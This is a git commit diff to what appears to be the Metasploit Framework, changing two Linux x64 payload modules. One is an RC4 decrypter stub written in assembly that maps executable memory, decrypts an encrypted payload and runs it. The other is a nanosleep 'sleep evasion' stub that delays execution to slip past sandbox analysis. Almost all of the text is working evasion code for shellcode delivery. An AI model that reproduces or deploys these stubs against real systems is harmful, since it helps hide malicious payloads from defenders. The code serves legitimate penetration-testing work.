cdd66793bfe6289d75b7fe4dd6f356fbfcabc3b2
litemars <maxmassi12@gmail.com>
2026-02-20 17:53:24 +0100

    updating the sleep evasion and the rc4_decrypter for x64

--- lib/msf/core/payload/linux/x64/rc4_decrypter.rb
+++ lib/msf/core/payload/linux/x64/rc4_decrypter.rb
@@ -1,6 +1,6 @@
 module Msf::Payload::Linux::X64::Rc4Decrypter
 
-  def rc4_decrypter_stub
+  def rc4_decrypter_stub(key_size: 0, payload_size: 0, encrypted_size: 0)
     asm = <<-ASM
 _start:
       jmp _get_data_addr
@@ -9,20 +9,19 @@ _got_data_addr:
       pop r12
 
       ; mmap(NULL, payload_size, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
-      mov rsi, qword [r12 + 8]
-      xor edi, edi 
-      mov edx, 7 
-      mov r10d, 0x22 
+      mov esi, #{payload_size}
+      xor edi, edi
+      mov edx, 7
+      mov r10d, 0x22
       mov r8d, 0xffffffff
       xor r9d, r9d
       mov eax, 9
       syscall
       mov r13, rax
 
-      ;Initialize S-box (256 bytes) on stack
-      sub rsp, 256 
+      ; Initialize S-box (256 bytes) on stack
+      sub rsp, 256
       mov rdi, rsp
-
       xor ecx, ecx
 _init_sbox:
       mov byte [rdi + rcx], cl
@@ -30,16 +29,14 @@ _init_sbox:
       cmp ecx, 256
       jne _init_sbox
 
-      ;  RC4 Key Scheduling Algorithm (KSA)
-      lea r8, [r12 + 24]
-      mov r9d, dword [r12]
+      ; RC4 Key Scheduling Algorithm (KSA)
+      mov r8, r12
+      mov r9d, #{key_size}
       xor ecx, ecx
       xor edx, edx
-
 _ksa_loop:
       movzx eax, byte [rdi + rcx]
       add edx, eax
-
       mov eax, ecx
 _mod_loop:
       cmp eax, r9d
@@ -47,47 +44,38 @@ _mod_loop:
       sub eax, r9d
       jmp _mod_loop
 _mod_done:
-
       movzx eax, byte [r8 + rax]
       add edx, eax
       and edx, 0xff
-
       movzx eax, byte [rdi + rcx]
       movzx r10d, byte [rdi + rdx]
       mov byte [rdi + rcx], r10b
       mov byte [rdi + rdx], al
-
       inc ecx
       cmp ecx, 256
       jne _ksa_loop
 
-      ; RC4 Pseudo-Random Generation Algorithm
-      lea r8, [r12 + 280]
-      mov r9d, dword [r12 + 16]
+      ; RC4 Pseudo-Random Generation Algorithm (PRGA)
+      lea r8, [r12 + 256]
+      mov r9d, #{encrypted_size}
       xor ecx, ecx
       xor edx, edx
       xor r10d, r10d
-
 _prga_loop:
       inc ecx
       and ecx, 0xff
-
       movzx eax, byte [rdi + rcx]
       add edx, eax
       and edx, 0xff
-
       movzx eax, byte [rdi + rcx]
       movzx r11d, byte [rdi + rdx]
       mov byte [rdi + rcx], r11b
       mov byte [rdi + rdx], al
-
       add eax, r11d
       and eax, 0xff
       movzx eax, byte [rdi + rax]
-
       xor al, byte [r8 + r10]
       mov byte [r13 + r10], al
-
       inc r10d
       cmp r10d, r9d
       jne _prga_loop
@@ -97,47 +85,30 @@ _prga_loop:
 
 _get_data_addr:
       call _got_data_addr
-; Data section layout (populated by rc4_decrypter):
-; offset +0:   key_size (8 bytes)
-; offset +8:   payload_size (8 bytes)
-; offset +16:  encrypted_size (8 bytes)
-; offset +24:  key_data (256 bytes)
-; offset +280: encrypted_data (variable length)
+
+; Data section layout:
+; offset +0:   key_data (256 bytes)
+; offset +256: encrypted_data (variable length)
     ASM
 
     Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
   end
 
   def rc4_decrypter(opts = {})
-    key = opts[:key] || Rex::Text.rand_text(16)
-    payload = opts[:data] || raise(ArgumentError, "Encrypted data required")
+    key            = opts[:key] || Rex::Text.rand_text(16)
+    payload        = opts[:data] || raise(ArgumentError, "Encrypted data required")
+    raise(ArgumentError, "Key must be <= 256 bytes") if key.length > 256
 
     encrypted_data = Rex::Crypto::Rc4.rc4(key, payload)
 
-    stub = rc4_decrypter_stub.dup
-    code_size = stub.length
+    stub = rc4_decrypter_stub(
+      key_size:       key.length,
+      payload_size:   payload.length,
+      encrypted_size: encrypted_data.length
+    )
 
-    # Data section offsets (relative to end of stub code)
-    key_size_offset = code_size
-    payload_size_offset = code_size + 8
-    encrypted_size_offset = code_size + 16
-    key_data_offset = code_size + 24
-    encrypted_data_offset = code_size + 280
-
-    # Allocate space for data section (24 bytes header + 256 bytes key)
-    stub << "\x00" * 280
-
-    # Patch in the values
-    stub[key_size_offset, 8] = [key.length].pack('Q<')
-    stub[payload_size_offset, 8] = [payload.length].pack('Q<')
-    stub[encrypted_size_offset, 8] = [encrypted_data.length].pack('Q<')
-    stub[key_data_offset, 256] = key.ljust(256, "\x00")
-
-    stub + encrypted_data
-  end
-
-  def stub_size
-    rc4_decrypter_stub.length + 280
+    stub << key.ljust(256, "\x00")
+    stub << encrypted_data
   end
 
 end
--- lib/msf/core/payload/linux/x64/sleep_evasion.rb
+++ lib/msf/core/payload/linux/x64/sleep_evasion.rb
@@ -1,40 +1,20 @@
 module Msf::Payload::Linux::X64::SleepEvasion
 
-    STUB_SLEEP_SECONDS_OFFSET = 0x02
+  def sleep_evasion(opts = {})
+    seconds = opts[:seconds] || rand(60)
+    asm = <<-ASM
+      ; nanosleep(&timespec, NULL)
+      push 0                  ; timespec.tv_nsec = 0
+      push #{seconds}         ; timespec.tv_sec = <seconds>
+      mov rdi, rsp            ; rdi -> timespec on stack
+      xor rsi, rsi            ; rsi = NULL (remaining time pointer)
+      mov eax, 35             ; syscall number for nanosleep (0x23)
+      syscall                 ; invoke syscall
+      add rsp, 16             ; restore stack
+      ; execution continues to appended payload
+    ASM
 
-    def sleep_stub
-      stub = ""
-
-      # 0x00: jmp 0x12                   ; jump forward to code (skip data section)
-      stub << [0xeb, 0x10].pack('C*')
-      # 0x02: timespec.tv_sec (8 bytes)  ; sleep duration in seconds (patched later)
-      stub << "\x00\x00\x00\x00\x00\x00\x00\x00"
-      # 0x0a: timespec.tv_nsec (8 bytes) ; nanoseconds component (always 0)
-      stub << "\x00\x00\x00\x00\x00\x00\x00\x00"
-      # 0x12: lea rdi, [rip-0x10]        ; rdi -> timespec structure (RIP-relative addressing)
-      stub << [0x48, 0x8d, 0x3d, 0xf0, 0xff, 0xff, 0xff].pack('C*')
-      # 0x19: xor rsi, rsi               ; rsi = NULL (remaining time pointer)
-      stub << [0x48, 0x31, 0xf6].pack('C*')
-      # 0x1c: mov rax, 35                ; syscall number for nanosleep (0x23)
-      stub << [0x48, 0xc7, 0xc0, 0x23, 0x00, 0x00, 0x00].pack('C*')
-      # 0x23: syscall                    ; invoke syscall
-      stub << [0x0f, 0x05].pack('C*')
-      # 0x25: execution continues to appended payload
-
-      stub
-    end
-
-    def sleep_evasion(opts = {})
-      seconds = opts[:seconds] || 0
-      return "" if seconds == 0
-
-      stub = sleep_stub.dup
-      stub[STUB_SLEEP_SECONDS_OFFSET, 8] = [seconds].pack('Q<')
-      stub
-    end
-
-    def sleep_stub_size
-      37
-    end
+    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
+  end
 
 end
